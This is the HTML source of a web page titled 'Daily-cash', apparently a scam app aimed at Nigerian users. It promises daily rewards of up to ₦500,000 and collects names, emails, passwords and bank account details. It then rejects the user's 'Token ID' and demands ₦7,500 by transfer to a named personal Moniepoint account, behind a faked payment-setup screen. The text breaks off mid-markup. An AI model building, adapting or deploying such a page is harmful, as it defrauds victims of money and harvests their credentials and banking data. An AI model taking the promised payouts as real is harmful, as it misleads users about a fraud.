<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Daily-cash</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        /* Global box-sizing */
        * { box-sizing: border-box; }

        body {
            font-family: 'Inter', sans-serif;
            background-color: #ffffff;
        }

        /* Loading Screen styles */
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            transition: opacity 0.5s;
        }

        .loading-spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-top: 4px solid #4CAF50;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .hidden {
            display: none !important;
        }

        /* Dashboard styles */
        .dashboard-container { display: none; }
        .dashboard { background-color: #008000; color: white; padding: 16px; border-radius: 12px; margin-bottom: 24px; position: relative; }
        .top-row { display: flex; justify-content: space-between; align-items: center; }
        .user-info { display: flex; align-items: center; gap: 8px; }
        .user-icon { background-color: white; color: #008000; width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 18px; }
        .greeting { display: flex; flex-direction: column; }
        .greeting h3 { font-size: 15px; }
        .greeting span { font-size: 13px; opacity: 0.9; }
        .bell-icon { width: 20px; height: 20px; background-color: #ccc; border-radius: 50%; }
        .balance-info { margin-top: 16px; }
        .balance-info p { font-size: 13px; }
        .balance-info h2 { font-size: 24px; font-weight: bold; }
        .eye-icon { position: absolute; top: 72px; right: 16px; width: 18px; height: 18px; background-color: white; border-radius: 50%; }
        .buttons { margin-top: 16px; display: flex; gap: 10px; }
        .buttons button, .buttons a {
            flex: 1; padding: 8px; border: none; border-radius: 16px; background-color: white;
            color: #008000; font-weight: bold; cursor: pointer; font-size: 14px;
            text-align: center; text-decoration: none; display: flex; justify-content: center; align-items: center;
        }
        .days-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
        .day-box { background-color: white; border: 2px solid black; border-radius: 8px; padding: 12px; text-align: center; font-weight: bold; font-size: 14px; color: black; cursor: pointer; }
        .day-box span.naira-symbol { display: block; font-size: 18px; color: gold; margin-bottom: 4px; }
        .day-box span.day-label { display: block; font-size: 13px; margin-bottom: 4px; }
        .day-box.active { background-color: #FFA500; color: white; border: none; }
        .day-box.active .naira-symbol, .day-box.active .day-label { color: white; }
        .day-box.claimed { background-color: #dcdcdc !important; color: #555 !important; cursor: not-allowed; border: 1px solid #ccc; }
        .day-box.disabled { opacity: 0.6; cursor: not-allowed; }

        /* Pop-up Styles */
        @import url('https://fonts.googleapis.com/css2?family=Lato:wght@400;700;900&display=swap');
        .modal-background {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            display: none; justify-content: center; align-items: center; z-index: 1000;
        }
        .popup {
            width: 80%; max-width: 400px; padding: 30px 20px; border-radius: 20px; text-align: center;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2); color: white; background: linear-gradient(to bottom, #ff5722, #ff9800);
            display: flex; flex-direction: column; align-items: center; justify-content: center;
        }
        .coin-icon {
            width: 100px; height: 100px; margin-bottom: 20px; border-radius: 50%;
            background: linear-gradient(to bottom, #ffd700, #ffcc00);
            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.1);
            position: relative; display: flex; justify-content: center; align-items: center;
        }
        .coin-icon::before {
            content: ''; position: absolute; width: 80%; height: 80%; border-radius: 50%;
            background: linear-gradient(to top, #ffcc00, #ffeb3b);
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
            border: 2px solid rgba(255, 255, 255, 0.3);
        }
        .congrats-text { font-size: 1.2em; font-weight: bold; margin-bottom: 10px; }
        .amount-text { font-size: 2.8em; font-weight: 900; line-height: 1.2; margin-bottom: 15px; }
        .amount-text::before { content: 'â‚¦'; font-size: 0.8em; }
        .detail-text { font-size: 0.9em; font-weight: 400; line-height: 1.5; max-width: 250px; opacity: 0.8; }
        .ok-button {
            width: 80%; max-width: 200px; margin-top: 30px; padding: 12px 20px; border: none; border-radius: 25px;
            background-color: #673ab7; color: white; font-size: 1em; font-weight: bold; text-transform: uppercase;
            cursor: pointer; box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }
        .ok-button:hover { background-color: #512da8; }

        /* Message for already claimed */
        .message {
            text-align: center;
            color: red;
            margin-top: 15px;
            font-weight: bold;
            display: none;
        }

        /* Hi-pop notification */
        .hi-pop-notification {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background-color: rgba(0, 0, 0, 0.85);
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            font-size: 14px;
            z-index: 1001;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
            opacity: 0;
            transition: opacity 0.5s ease-in-out;
        }
        .hi-pop-notification.show {
            opacity: 1;
        }


        /* Withdrawal page styles */
        #withdrawal-container {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            width: 100%;
            background-color: #f0f0f0;
        }
        .container {
            width: 100%;
            max-width: 400px;
            background-color: #ffffff;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .header {
            background-color: #2e7d32;
            color: #ffffff;
            display: flex;
            align-items: center;
            padding: 15px;
            font-size: 1.2em;
            font-weight: 500;
        }
        .header .back-arrow {
            font-size: 1.5em;
            margin-right: 15px;
            cursor: pointer;
        }
        .image-container {
            width: 100%;
            height: 150px;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .image-container img {
            width: 100%;
            height: auto;
            object-fit: cover;
            object-position: center bottom;
        }
        .form-container {
            padding: 20px;
            background-color: #ffffff;
        }
        .input-group {
            margin-bottom: 20px;
            position: relative;
        }
        .input-field {
            width: 100%;
            padding: 15px;
            font-size: 1em;
            border: 2px solid #ccc;
            border-radius: 30px;
            box-sizing: border-box;
            color: #555;
            outline: none;
        }
        .input-field::placeholder {
            color: #888;
        }
        .select-field {
            width: 100%;
            padding: 15px;
            font-size: 1em;
            border: 2px solid #2e7d32;
            border-radius: 30px;
            box-sizing: border-box;
            color: #2e7d32;
            background-color: #ffffff;
            cursor: pointer;
            outline: none;
            appearance: none;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="%232e7d32" class="bi bi-chevron-down" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"/></svg>');
            background-repeat: no-repeat;
            background-position: right 15px center;
        }
        .select-field:focus {
            border-color: #2e7d32;
        }
        .buy-token-link-container {
            width: 100%;
            text-align: left;
            margin-top: 5px;
        }
        .buy-token-link-container a {
            color: #2e7d32;
            text-decoration: none;
            font-weight: 500;
            font-size: 0.9em;
            cursor: pointer;
        }
        .buy-token-link-container a:hover {
            text-decoration: underline;
        }
        .button {
            width: 100%;
            padding: 15px;
            font-size: 1.1em;
            font-weight: 500;
            color: #ffffff;
            background-color: #2e7d32;
            border: 2px solid #2e7d32;
            border-radius: 30px;
            cursor: pointer;
            text-align: center;
        }
        .main-container {
            font-family: 'Inter', sans-serif;
            display: none;
            flex-direction: column;
            justify-content: space-between;
            min-height: 100vh;
            background-color: #f8fafc;
            width: 100%;
            max-width: 400px;
        }
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            display: none;
        }
        .modal {
            background-color: white;
            padding: 25px;
            border-radius: 15px;
            text-align: center;
            width: 90%;
            max-width: 350px;
            position: relative;
        }
        .modal .close-icon {
            position: absolute;
            top: 15px;
            right: 15px;
            cursor: pointer;
            font-size: 1.5em;
            color: #aaa;
        }
        .modal h3 {
            font-size: 1.2em;
            font-weight: 500;
            color: #333;
            margin-top: 10px;
            margin-bottom: 25px;
        }
        .modal .buy-token-button {
            background-color: #673ab7;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 25px;
            font-weight: 500;
            cursor: pointer;
            font-size: 1em;
        }
        .modal .buy-token-button:hover {
            background-color: #512da8;
        }

        /* Styles for the second code block (Buy Token ID) */
        #buy-token-section {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            width: 100%;
            background-color: #f0f2f5;
        }
        /* New styles to avoid conflict with the first page's CSS */
        #buy-token-section .screen {
            display: none;
            width: 100%;
            max-width: 400px;
            flex-direction: column;
        }
        #buy-token-section .screen.active {
            display: flex;
        }
        #buy-token-section .container {
            background-color: #ffffff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            overflow: hidden;
        }
        #buy-token-section .header {
            background-color: #6a0dad;
            color: #ffffff;
            padding: 15px 20px;
            font-size: 1.2em;
            font-weight: bold;
        }
        #buy-token-section .form-section {
            padding: 20px;
        }
        #buy-token-section .form-group {
            margin-bottom: 20px;
        }
        #buy-token-section .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #333;
        }
        #buy-token-section .form-group input {
            width: calc(100% - 20px);
            padding: 12px 10px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 1em;
            box-sizing: border-box;
        }
        #buy-token-section .amount-display {
            background-color: #f7f7f7;
            padding: 12px 10px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 1em;
            color: #333;
            width: calc(100% - 20px);
            box-sizing: border-box;
        }
        #buy-token-section .pay-button {
            width: 100%;
            padding: 15px;
            background-color: #6a0dad;
            color: #ffffff;
            border: none;
            border-radius: 6-px;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
        }
        #buy-token-section .info-text {
            text-align: center;
            margin-top: 25px;
            font-size: 0.9em;
            color: #666;
            padding: 0 20px 20px;
        }
        #buy-token-section #screen2 {
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        #buy-token-section #screen2 .header {
            background-color: #5b21b6;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            color: white;
            padding: 15px 20px;
            font-size: 20px;
            font-weight: bold;
            box-sizing: border-box;
        }
        #buy-token-section .spinner {
            border: 8px solid rgba(0, 0, 0, 0.1);
            border-left-color: #5b21b6;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1.2s linear infinite;
            margin-bottom: 30px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #buy-token-section .title {
            font-size: 24px;
            font-weight: bold;
            color: #333;
            margin-bottom: 10px;
        }
        #buy-token-section .subtitle {
            font-size: 16px;
            color: #666;
            margin-bottom: 40px;
        }
        #buy-token-section .progress-bar-container {
            width: 80%;
            max-width: 300px;
            background-color: #e0e0e0;
            border-radius: 5px;
            height: 8px;
            overflow: hidden;
        }
        #buy-token-section .progress-bar {
            height: 100%;
            background-color: #5b21b6;
            animation: fillProgress 3s ease-in-out forwards;
        }
        @keyframes fillProgress {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        #buy-token-section #screen3 {
            padding: 20px;
            justify-content: center;
            align-items: center;
        }
        #buy-token-section .bank-container {
            max-width: 400px;
            width: 100%;
            border: 1px solid #ccc;
            border-radius: 12px;
            padding: 20px;
            background-color: #fff;
            color: #000;
        }
        #buy-token-section .top-section {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        #buy-token-section .logo-circle {
            width: 60px;
            height: 60px;
            background-color: #1900ff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        #buy-token-section .logo-circle::before {
            content: "";
            width: 25px;
            height: 25px;
            border: 3px solid orange;
            border-radius: 50%;
        }
        #buy-token-section .top-right {
            text-align: right;
        }
        #buy-token-section .top-right h2 {
            margin: 0;
        }
        #buy-token-section .top-right small {
            color: #555;
            display: block;
            margin-bottom: 5px;
        }
        #buy-token-section .message {
            text-align: center;
            margin: 20px 0;
            font-size: 17px;
        }
        #buy-token-section .info-box {
            border: 1px solid #ddd;
            border-radius: 10px;
            padding: 15px;
        }
        #buy-token-section .info-row {
            margin-bottom: 15px;
        }
        #buy-token-section .info-label {
            color: #555;
            font-size: 14px;
        }
        #buy-token-section .info-value {
            font-size: 16px;
            font-weight: bold;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        #buy-token-section .copy-btn {
            background-color: #ff9900;
            border: none;
            color: white;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 13px;
            cursor: pointer;
        }
        #buy-token-section .note {
            margin-top: 10px;
            font-size: 15px;
        }
        #buy-token-section .confirm-btn {
            margin-top: 20px;
            background-color: #ff9900;
            color: white;
            border: none;
            width: 100%;
            padding: 15px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        #buy-token-section #screen4-loading, #buy-token-section #screen4-failed {
            min-height: 100vh;
            background-color: #fff;
        }
        #buy-token-section #screen4-loading {
            display: block;
            text-align: center;
        }
        #buy-token-section #screen4-loading .header {
            background-color: #2e0d6d;
        }
        #buy-token-section .loader-container {
            margin-top: 60px;
        }
        #buy-token-section .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #ff7a00;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }
        #buy-token-section #screen4-loading .progress-bar-container {
            margin: 40px auto 20px;
            width: 90%;
            height: 8px;
            background-color: #e0e0e0;
            border-radius: 10px;
            overflow: hidden;
        }
        #buy-token-section #screen4-loading .progress-bar {
            height: 100%;
            width: 0%;
            background-color: #ff7a00;
            transition: width 0.4s ease;
        }
        #buy-token-section #screen4-loading .note {
            font-size: 14px;
            color: #7f8c8d;
            margin-top: 20px;
        }
        #buy-token-section #screen4-failed {
            display: none;
            background-color: #f8f8f8;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        #buy-token-section .failed-container {
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            text-align: center;
            padding: 40px 30px;
            max-width: 400px;
            width: 100%;
        }
        #buy-token-section .icon-circle {
            width: 80px;
            height: 80px;
            background-color: #ff4d4f;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 30px;
        }
        #buy-token-section .icon-circle svg {
            fill: #fff;
            width: 40px;
            height: 40px;
        }
        #buy-token-section h1 {
            color: #fa8c16;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 20px;
        }
        #buy-token-section p {
            color: #595959;
            font-size: 16px;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        #buy-token-section .contact-info {
            font-size: 14px;
            color: #595959;
            margin-top: 20px;
        }
        #buy-token-section .email-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
            margin-top: 10px;
        }
        #buy-token-section .email-wrapper a {
            color: #1890ff;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
        }
        #buy-token-section .copy-icon {
            width: 18px;
            height: 18px;
            cursor: pointer;
            fill: #8c8c8c;
            transition: fill 0.2s ease;
        }
        #buy-token-section .copy-icon:hover {
            fill: #1890ff;
        }
        #buy-token-section .button {
            display: block;
            width: 100%;
            padding: 15px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            text-align: center;
            text-decoration: none;
            margin-top: 15px;
            cursor: pointer;
        }
        #buy-token-section .button.primary {
            background-color: #8a2be2;
            color: #fff;
        }
        #buy-token-section .button.primary:hover {
            background-color: #7b24cc;
        }
        #buy-token-section .button.secondary {
            background-color: #fff;
            color: #595959;
            border: 2px solid #d9d9d9;
        }
        #buy-token-section .button.secondary:hover {
            background-color: #f0f0f0;
        }

        /* Styles for the Opay Notice pop-up */
        .opay-notice-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.6);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        .opay-notice-popup {
            background: #fff;
            border-radius: 12px;
            padding: 20px;
            max-width: 350px;
            text-align: center;
            animation: fadeIn 0.3s ease-out;
        }
        .opay-notice-popup h2 {
            color:red;
            font-size:18px;
            margin-bottom:15px;
        }
        .opay-notice-popup p {
            font-size:14px;
            color:#333;
            line-height:1.5;
        }
        .opay-notice-popup button {
            margin-top:20px;
            background:#6a0dad;
            color:#fff;
            border:none;
            padding:10px 20px;
            border-radius:8px;
            cursor:pointer;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }
    </style>
</head>
<body class="bg-gray-50 flex items-center justify-center min-h-screen">
    <div id="main-app-container" class="px-4 w-full max-w-md mx-auto">
        <div id="auth-section" class="flex flex-col items-center">
            <header class="w-full flex justify-end mb-8">
                <a href="#" class="text-orange-500 font-medium hover:underline text-sm">Need Help?</a>
            </header>

            <div class="flex flex-col items-center mb-8">
                <img src="https://github.com/darkweb765/Go-pay/raw/main/IMG-20250808-WA0003.jpg"
                     alt="App Logo"
                     class="w-24 h-24 object-contain mb-4">
                <h1 id="form-title" class="text-xl font-bold text-gray-800 text-center">Register to continue</h1>
            </div>

            <form id="registration-form" class="w-full">
                <div class="mb-4">
                    <input type="text" id="reg-fullname" placeholder="Full Name" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:outline-none focus:border-blue-500">
                </div>
                <div class="mb-4">
                    <input type="email" id="reg-email" placeholder="Email Address" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:outline-none focus:border-blue-500">
                </div>
                <div class="mb-6">
                    <input type="password" id="reg-password" placeholder="Password" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:outline-none focus:border-blue-500">
                </div>
                <p id="reg-error-message" class="text-red-500 text-sm mb-4 hidden"></p>
                <button type="submit" class="w-full bg-[#4CAF50] text-white py-3 rounded-xl font-semibold shadow-md hover:bg-green-600 transition-colors duration-300">Register</button>
            </form>

            <form id="login-form" class="w-full hidden">
                <div class="mb-4">
                    <input type="email" id="login-email" placeholder="Email Address" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:outline-none focus:border-blue-500">
                </div>
                <div class="mb-6">
                    <input type="password" id="login-password" placeholder="Password" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:outline-none focus:border-blue-500">
                </div>
                <p id="login-error-message" class="text-red-500 text-sm mb-4 hidden"></p>
                <button type="submit" class="w-full bg-[#4CAF50] text-white py-3 rounded-xl font-semibold shadow-md hover:bg-green-600 transition-colors duration-300">Login</button>
            </form>

            <footer class="w-full text-center mt-6 text-sm">
                <p id="toggle-text" class="text-gray-600">Already have an account? <a id="toggle-link" href="#" class="text-orange-500 font-medium hover:underline">Login</a></p>
            </footer>
        </div>

        <div id="dashboard-container" class="dashboard-container">
            <div class="dashboard">
                <div class="top-row">
                    <div class="user-info">
                        <div class="user-icon" id="user-icon-initial">V</div>
                        <div class="greeting">
                            <h3 id="user-greeting">Hi, Victory ðŸ‘‹</h3>
                            <span>Welcome back!</span>
                        </div>
                    </div>
                    <div class="bell-icon"></div>
                </div>

                <div class="balance-info">
                    <p>Your Balance</p>
                    <h2 id="balance">â‚¦0.00</h2>
                    <p>Daily Rewards: <span id="dailyRewardsBalance">â‚¦100,000.00</span></p>
                </div>

                <div class="eye-icon"></div>

                <div class="buttons">
                    <a href="https://whatsapp.com/channel/0029Vb6PDHY6hENkLPtlGj30" target="_blank">Join Group</a>
                    <button id="withdrawal-btn">Withdrawal</button>
                </div>
            </div>

            <div class="days-grid">
                <div class="day-box" data-amount="100000"><span class="day-label">Day 1</span><span class="naira-symbol">â‚¦</span>â‚¦100,000</div>
                <div class="day-box" data-amount="150000"><span class="day-label">Day 2</span><span class="naira-symbol">â‚¦</span>â‚¦150,000</div>
                <div class="day-box" data-amount="200000"><span class="day-label">Day 3</span><span class="naira-symbol">â‚¦</span>â‚¦200,000</div>
                <div class="day-box" data-amount="250000"><span class="day-label">Day 4</span><span class="naira-symbol">â‚¦</span>â‚¦250,000</div>
                <div class="day-box" data-amount="300000"><span class="day-label">Day 5</span><span class="naira-symbol">â‚¦</span>â‚¦300,000</div>
                <div class="day-box" data-amount="350000"><span class="day-label">Day 6</span><span class="naira-symbol">â‚¦</span>â‚¦350,000</div>
                <div class="day-box" data-amount="400000"><span class="day-label">Day 7</span><span class="naira-symbol">â‚¦</span>â‚¦400,000</div>
                <div class="day-box" data-amount="450000"><span class="day-label">Day 8</span><span class="naira-symbol">â‚¦</span>â‚¦450,000</div>
                <div class="day-box" data-amount="500000"><span class="day-label">Day 9</span><span class="naira-symbol">â‚¦</span>â‚¦500,000</div>
            </div>

            <div class="message" id="message"></div>

            <div class="modal-background" id="popup">
                <div class="popup">
                    <div class="congrats-text">Congratulations!</div>
                    <div class="coin-icon"></div>
                    <div class="amount-text" id="popupAmount">60,000</div>
                    <div class="detail-text">Congratulations you got â‚¦<span id="popupAmountText">60,000</span> successfully from daily cash.</div>
                    <button class="ok-button" id="okBtn">OK</button>
                </div>
            </div>
        </div>
    </div>

    <div id="hi-pop-notification" class="hi-pop-notification">
        You have claimed your today rewards. Wait for 24 hours before claiming again.
    </div>

    <div id="withdrawal-container">
        <div class="container" id="withdrawal-form-section">
            <div class="header">
                <span class="back-arrow" id="withdrawal-back-arrow">&larr;</span>
                <span>Withdraw To Bank</span>
            </div>

            <div class="image-container">
                <img src="https://raw.githubusercontent.com/darkweb765/Go-pay/main/IMG-20250808-WA0004.jpg" alt="Nigerian Naira notes" />
            </div>

            <div class="form-container">
                <div class="input-group">
                    <input type="text" class="input-field" id="account-name" placeholder="Account name" />
                </div>
                <div class="input-group">
                    <input type="text" class="input-field" id="account-number" placeholder="Account number" />
                </div>
                <div class="input-group">
                    <select class="select-field" id="bank-select">
                        <option value="" disabled selected>Select your bank</option>
                        <option value="Opay">Opay</option>
                        <option value="PalmPay">PalmPay</option>
                        <option value="Paystack">Paystack</option>
                        <option value="Flutterwave">Flutterwave</option>
                        <option value="Kuda Bank">Kuda Bank</option>
                        <option value="Alat by Wema">Alat by Wema</option>
                        <option value="GTBank">GTBank</option>
                        <option value="FirstBank">FirstBank</option>
                        <option value="Access Bank">Access Bank</option>
                        <option value="Zenith Bank">Zenith Bank</option>
                        <option value="Paga">Paga</option>
                        <option value="Interswitch">Interswitch</option>
                        <option value="Chipper Cash">Chipper Cash</option>
                        <option value="Carbon">Carbon</option>
                        <option value="Branch">Branch</option>
                        <option value="Keenly">Keenly</option>
                        <option value="Moniepoint">Moniepoint</option>
                        <option value="VoguePay">VoguePay</option>
                        <option value="Airtel Money">Airtel Money</option>
                        <option value="United Bank for Africa (UBA)">United Bank for Africa (UBA)</option>
                        <option value="Fidelity Bank">Fidelity Bank</option>
                        <option value="EcoBank Nigeria">EcoBank Nigeria</option>
                        <option value="Union Bank of Nigeria">Union Bank of Nigeria</option>
                        <option value="Sterling Bank">Sterling Bank</option>
                        <option value="Polaris Bank">Polaris Bank</option>
                        <option value="Wema Bank">Wema Bank</option>
                        <option value="Keystone Bank">Keystone Bank</option>
                        <option value="FCMB (First City Monument Bank)">FCMB (First City Monument Bank)</option>
                        <option value="Stanbic IBTC Bank">Stanbic IBTC Bank</option>
                        <option value="Citibank Nigeria">Citibank Nigeria</option>
                        <option value="Unity Bank">Unity Bank</option>
                        <option value="Heritage Bank">Heritage Bank</option>
                        <option value="Jaiz Bank">Jaiz Bank</option>
                        <option value="Titan Trust Bank">Titan Trust Bank</option>
                        <option value="Providus Bank">Providus Bank</option>
                        <option value="SunTrust Bank">SunTrust Bank</option>
                        <option value="Rand Merchant Bank (RMB) Nigeria">Rand Merchant Bank (RMB) Nigeria</option>
                        <option value="Paragon Bank">Paragon Bank</option>
                        <option value="Coronation Merchant Bank">Coronation Merchant Bank</option>
                        <option value="Globus Bank">Globus Bank</option>
                        <option value="VFD Microfinance Bank">VFD Microfinance Bank</option>
                        <option value="FBNQuest Merchant Bank">FBNQuest Merchant Bank</option>
                        <option value="Standard Chartered Bank Nigeria">Standard Chartered Bank Nigeria</option>
                        <option value="Chapman Mortgage Bank">Chapman Mortgage Bank</option>
                        <option value="Nova Merchant Bank">Nova Merchant Bank</option>
                        <option value="CBN (Central Bank of Nigeria)">CBN (Central Bank of Nigeria)</option>
                        <option value="New Prudential Bank">New Prudential Bank</option>
                        <option value="Mutual Trust Bank">Mutual Trust Bank</option>
                        <option value="TrustBond Mortgage Bank">TrustBond Mortgage Bank</option>
                        <option value="FSDH Merchant Bank">FSDH Merchant Bank</option>
                        <option value="Premium Trust Bank">Premium Trust Bank</option>
                        <option value="FBN Mortgages Limited">FBN Mortgages Limited</option>
                        <option value="Infinity Trust Mortgage Bank">Infinity Trust Mortgage Bank</option>
                        <option value="Fortis Microfinance Bank">Fortis Microfinance Bank</option>
                        <option value="Sterling Microfinance Bank">Sterling Microfinance Bank</option>
                    </select>
                </div>
                <div class="input-group">
                    <input type="text" class="input-field" id="amount" placeholder="Amount" />
                </div>
                <div class="input-group">
                    <input type="password" class="input-field" id="token-id" placeholder="Token ID" />
                    <div class="buy-token-link-container">
                        <a href="#" id="buy-token-link"> Buy Token ID</a>
                    </div>
                </div>
                <div class="input-group">
                    <button class="button" id="withdraw-button">WITHDRAW</button>
                </div>
            </div>
        </div>

        <div class="main-container" id="success-section">
            <main class="flex-grow flex flex-col items-center justify-center p-6">
                <div class="w-full max-w-xs text-center">
                    <div class="relative inline-flex items-center justify-center w-32 h-32">
                        <div class="absolute w-full h-full bg-green-100 rounded-full"></div>
                        <div class="absolute w-24 h-24 bg-green-200 rounded-full"></div>
                        <div class="relative w-20 h-20 bg-green-500 rounded-full flex items-center justify-center">
                            <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
                            </svg>
                        </div>
                    </div>
                    <h1 class="text-2xl font-bold text-gray-800 mt-8">Withdrawal successfully</h1>
                    <p class="text-3xl font-extrabold text-gray-900 my-3" id="success-amount">â‚¦100.00</p>
                    <div class="text-left w-full mt-10">
                        <h2 class="text-sm font-medium text-gray-500 mb-4">Transaction Details</h2>
                        <div class="space-y-4 text-sm">
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600">Bank</span>
                                <span class="font-bold text-gray-900" id="success-bank">Opay bank</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600">Account number</span>
                                <span class="font-bold text-gray-900" id="success-account-number">0987654321</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600">Account name</span>
                                <span class="font-bold text-gray-900 text-right" id="success-account-name">Emmanuel CHIBUIKE CHUKWU</span>
                            </div>
                            <div class="flex justify-between items-center">
                                <span class="text-gray-600">Amount</span>
                                <span class="font-bold text-gray-900" id="success-amount-details">â‚¦100.00</span>
                            </div>
                        </div>
                    </div>
                </div>
            </main>
            <footer class="w-full p-6">
                <div class="w-full max-w-xs mx-auto">
                    <button class="w-full bg-green-500 text-white font-bold py-4 px-4 rounded-xl" id="done-button">Done</button>
                </div>
            </footer>
        </div>

        <div class="modal-overlay" id="token-modal">
            <div class="modal">
                <div class="close-icon" id="close-modal-icon">&times;</div>
                <h3>Incorrect Token ID.<br>Click the button below to buy your Token ID.</h3>
                <button class="buy-token-button" id="modal-buy-token-button">Buy Token ID</button>
            </div>
        </div>

        <div id="buy-token-section">
            <div id="screen1" class="screen active">
              <div class="container">
                <div class="header">Buy Token ID</div>
                <div class="form-section">
                  <div class="form-group">
                    <label>Amount</label>
                    <div class="amount-display">â‚¦7,500</div>
                  </div>
                  <div class="form-group">
                    <label>Full Name</label>
                    <input type="text" id="fullName" placeholder="Your full name">
                  </div>
                  <div class="form-group">
                    <label>Your Email Address</label>
                    <input type="email" id="emailAddress" placeholder="email address">
                  </div>
                  <button class="pay-button" onclick="goToLoading()">Pay</button>
                </div>
                <div class="info-text">Your Token ID will be sent to your email once your payment is confirmed.</div>
              </div>
            </div>

            <div id="screen2" class="screen">
              <div class="header">Buy Token ID</div>
              <div class="spinner"></div>
              <div class="title">Preparing Payment Account</div>
              <div class="subtitle">Please wait while we set up your payment...</div>
              <div class="progress-bar-container">
                <div class="progress-bar"></div>
              </div>
            </div>

            <div id="screen3" class="screen">
              <div class="bank-container">
                <div class="top-section">
                  <div class="logo-circle"></div>
                  <div class="top-right">
                    <small id="userEmail">example@email.com</small>
                    <h2>NGN 7,500</h2>
                  </div>
                </div>

                <div class="message">Proceed to your bank app to complete this Transfer</div>

                <div class="info-box">
                  <div class="info-row">
                    <div class="info-label">Amount</div>
                    <div class="info-value">NGN 7,500</div>
                  </div>

                  <div class="info-row">
                    <div class="info-label">Account Number</div>
                    <div class="info-value">
                      <span id="acct">5082150846</span>
                      <button class="copy-btn" onclick="copyToClipboard('acct')">Copy</button>
                    </div>
                  </div>

                  <div class="info-row">
                    <div class="info-label">Bank Name</div>
                    <div class="info-value">Moniepoint</div>
                  </div>

                  <div class="info-row">
                    <div class="info-label">Account Name</div>
                    <div class="info-value">VICTOR NNAMDI</div>
                  </div>
                </div>

